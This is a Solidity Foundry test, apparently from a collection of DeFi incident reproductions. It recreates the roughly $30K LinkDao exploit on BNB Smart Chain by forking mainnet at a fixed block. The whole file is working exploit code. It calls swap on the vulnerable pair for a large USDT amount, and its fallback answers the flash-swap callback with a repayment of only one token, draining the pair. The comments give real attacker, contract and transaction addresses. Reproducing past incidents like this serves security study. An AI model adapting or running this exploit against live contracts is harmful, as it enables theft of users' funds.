// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~$30K
// Attacker : https://bscscan.com/address/0xdf6b0200b4e1bc4a310f33df95a9087cc2c79038
// Attack Contract : https://bscscan.com/address/0x721a66c7767103e7dcacf8440e8dd074edff40a8
// Vulnerable Contract : https://bscscan.com/address/0x6524a5fd3fec179db3b3c1d21f700da7abe6b0de
// Attack Tx : https://explorer.phalcon.xyz/tx/bsc/0x4ed59e3013215c272536775a966f4365112997a6eec534d38325be014f2e15ee

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x6524a5fd3fec179db3b3c1d21f700da7abe6b0de#code

// @Analysis
// Twitter Guy : https://x.com/phalcon_xyz/status/1725058908144746992

interface IUniswapV2Pair {
    event Transfer(address indexed from, address indexed to, uint256 value);

    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);

    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract LinkDao_exp is Test {
    address immutable r = address(this);

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 33_527_744);
        // vm.createSelectFork("https://rpc.ankr.com/bsc", bytes32(0x4ed59e3013215c272536775a966f4365112997a6eec534d38325be014f2e15ee));
    }

    IUniswapV2Pair constant x55d3 = IUniswapV2Pair(0x55d398326f99059fF775485246999027B3197955);
    IUniswapV2Pair constant x6524 = IUniswapV2Pair(0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de);

    function test() public {
        // vm.prank(0xdF6B0200B4e1Bc4a310F33DF95a9087cC2C79038, 0xdF6B0200B4e1Bc4a310F33DF95a9087cC2C79038);
        x2effb772();
    }

    function x2effb772() public {
        x55d3.balanceOf(address(x6524));
        x6524.swap(29_663_356_140_000_000_000_000, 0, r, hex"313233");
    }

    function xdc6eaaa9() public {
        x55d3.transfer(address(x6524), 1_000_000_000_000_000_000);
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0xdc6eaaa9) {
            return xdc6eaaa9();
        }
        revert("no such function");
    }
}
